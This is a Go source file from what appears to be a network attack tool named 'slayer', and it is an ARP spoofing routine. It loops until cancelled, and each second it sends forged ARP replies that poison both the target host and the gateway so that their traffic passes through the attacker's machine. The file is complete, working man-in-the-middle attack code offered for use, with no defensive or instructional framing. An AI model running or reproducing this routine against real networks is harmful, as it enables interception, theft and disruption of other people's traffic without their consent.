package spoof

import (
	"context"
	"fmt"
	"net"
	"time"

	"github.com/prabalesh/slayer/internal/networking/arp"
)

func Spoof(ctx context.Context, iface *net.Interface, targetIP net.IP, targetMAC net.HardwareAddr, gatewayIP net.IP, gatewayMAC net.HardwareAddr) {
	attackerMAC := iface.HardwareAddr

	fmt.Printf("[*] Starting ARP spoofing for %s ⇄ %s...\n", targetIP, gatewayIP)

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			fmt.Printf("[!] Stopping spoofing for %s\n", targetIP)
			return
		case <-ticker.C:
			// Poison target: "Gateway is at our MAC"
			packet1 := arp.BuildPacket(attackerMAC, targetMAC, gatewayIP, targetIP, 2)
			if err := arp.Send(iface, packet1, targetMAC); err != nil {
				fmt.Printf("[!] Failed to send ARP to target %s: %v\n", targetIP, err)
			}

			// Poison gateway: "Target is at our MAC"
			packet2 := arp.BuildPacket(attackerMAC, gatewayMAC, targetIP, gatewayIP, 2)
			if err := arp.Send(iface, packet2, gatewayMAC); err != nil {
				fmt.Printf("[!] Failed to send ARP to gateway %s: %v\n", gatewayIP, err)
			}
		}
	}
}
